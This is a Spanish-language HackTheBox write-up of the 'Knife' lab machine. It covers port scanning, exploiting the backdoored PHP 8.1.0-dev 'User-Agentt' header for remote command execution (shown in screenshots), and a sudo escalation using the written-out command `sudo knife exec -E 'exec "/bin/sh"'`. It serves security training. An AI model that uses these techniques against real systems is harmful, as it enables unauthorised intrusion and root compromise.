---
title: "Knife - HTB Writeup"
layout: single
excerpt: "Knife es una máquina de dificultad fácil de HackTheBox. En esta máquina explotamos un backdoor de una versión de PHP para acceder. Para escalar privilegios abusamos de un binario que podemos correr como root"
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/131227706-27ff0185-2d61-42b9-9e95-8eb4dc055758.png"
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - Backdoor
  - PHP
  - Sudo
  - Linux
---

![titulo](https://user-images.githubusercontent.com/67548295/131227718-00ab6578-c969-4bd9-b441-91c99cccc9f1.png)

# Enumeración

Empezamos enviando una traza [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet) con la herramienta `ping`, con esto veremos el estado de la máquina y su sistema operativo:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ping -c 1 10.10.10.242
PING 10.10.10.242 (10.10.10.242) 56(84) bytes of data.
64 bytes from 10.10.10.242: icmp_seq=1 ttl=63 time=76.8 ms

--- 10.10.10.242 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 76.791/76.791/76.791/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está activa y que observando el TTL, concluimos que es una máquina Linux.

Más información sobre la detección de OS mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/).

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier).

## Nmap

Empezamos con la fase de escaneo de puertos, en mi caso utilizaré la famosa herramienta `nmap`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $sudo nmap -p- --open -sS --min-rate 4000 -v -n 10.10.10.242 -sC -sV -oN targeted
 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-28 19:46 WEST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Scanning 10.10.10.242 [4 ports]
Completed Ping Scan at 19:46, 0.12s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:46
Scanning 10.10.10.242 [65535 ports]
Discovered open port 22/tcp on 10.10.10.242
Discovered open port 80/tcp on 10.10.10.242
Initiating Service scan at 19:46
Completed NSE at 19:46, 0.00s elapsed
Nmap scan report for 10.10.10.242
Host is up (0.079s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
Initiating NSE at 19:46
Completed NSE at 19:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.81 seconds
           Raw packets sent: 66450 (2.924MB) | Rcvd: 66447 (2.658MB)
```

| Parámetro | Acción |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto. |
| `--min-rate [valor]` | envía paquetes tan o más rápido que la tasa dada. |
| `-v` | Especifica que queremos más 'verbose', es decir, que nos muestre mas información de la convencional. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

Vemos 2 puertos

| Puerto | Servicio |
|:------:|:--------:|
| 22 | [SSH](https://www.hostinger.es/tutoriales/que-es-ssh) |
| 80 | [HTTP](https://developer.mozilla.org/es/docs/Web/HTTP) |

# User.txt

Una vez completada la enumeración de puertos, empiezo enumerando el servicio HTTP con el navegador:

![navegador1](https://user-images.githubusercontent.com/67548295/131227985-82b9c893-5cca-4ef2-8e90-290bc295361c.png)

Veo lo que parece ser una web relacionada con temas de salud y medicina.

Enumero las tecnologías que tiene con la herramienta `whatweb`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $whatweb http://10.10.10.242
http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)],
IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```
Y si nos fijamos, la versión de PHP es un tanto extraña, asi que busco información acerca de esa versión.

Hasta que encuentro lo siguiente:

![navegador2](https://user-images.githubusercontent.com/67548295/131228064-45645063-de70-4afd-85e6-0b991c9fe1ba.png)

Parece ser un exploit para esta versión, y encima un RCE!

Este release de PHP vino con un backdoor pero fue rápidamente eliminado. Este backdoor consiste en una modificación de la cabecera User-Agent. [Link](https://www.welivesecurity.com/2021/03/30/backdoor-php-source-code-git-server-breach/) a la noticia

En el exploit se puede ver con mas claridad:

![navegador3](https://user-images.githubusercontent.com/67548295/131228397-6ab974e1-47bf-447f-914f-a50a355de70f.png)

En la cabecera "User-Agentt" podemos introducir comandos.

Probemos a hacer esto con una petición con la herramienta `curl`:

![terminal1](https://user-images.githubusercontent.com/67548295/131228538-ccb73af6-814f-478e-8461-180a51d1e6dd.png)


| Parámetro | Acción |
|:---------:|:------:|
| `-H "cabecera"` | Establece una cabecera extra para hacer la petición |

Como podemos ver, funciona este RCE.

Con esto consigo meterme al sistema mediante una [reverse shell](https://segchock.blogspot.com/2018/02/reverse-shell-bind-shell.html)

![terminal2](https://user-images.githubusercontent.com/67548295/131228791-f3498304-f063-4e4f-beda-3e672cd9256e.png)

Ya podríamos ver la flag `user.txt` en el directorio /home/james/user.txt:

```bash
james@knife:/$ cat /home/james/user.txt 
9a2XXXXXXXXXXXXXXXXXXXXXXXXXXX28
```

# root.txt

Enumero el sistema como el usuario `james`.

Pruebo a hacer un `sudo -l` y vemos que podemos ejecutar este binario como root:

```bash
james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
Lo primero que se me ocurre es ir a [GTFObins](https://gtfobins.github.io/) para ver si está comtemplada la explotación de este binario.

![terminal3](https://user-images.githubusercontent.com/67548295/131229016-50388fb4-cada-4992-ae9d-4dece1101dac.png)

Vemos que si está contemplada.

Probamos a ejecutar ese comando y conseguimos una shell como `root`:

```bash
james@knife:/$ sudo knife exec -E 'exec "/bin/sh"'

# whoami
root
```

Ya a partir de aquí podríamos ver la flag `root.txt` en el directorio /root/root.txt:

```bash
# cat /root/root.txt
4XXXXXXXXXXXXXXXXXXXXXXXXX1cba
```

# Resumen y autopwn

En esta máquina hemos explotado una versión de PHP que venía con un backdoor, podíamos ejecutar comandos de forma remota a través de una cabecera modificada.
En la escalada de privilegios hemos abusado de un binario que podíamos ejecutar como root gracias a un permiso de sudoers. Tambien he creado un script autopwn que te da una shell como root tras ejecutarlo, lo tienes disponible en mi [GitHub](https://github.com/z3rObyte/HackTheBox-Autopwn/blob/main/Knife-autoPWN.py)
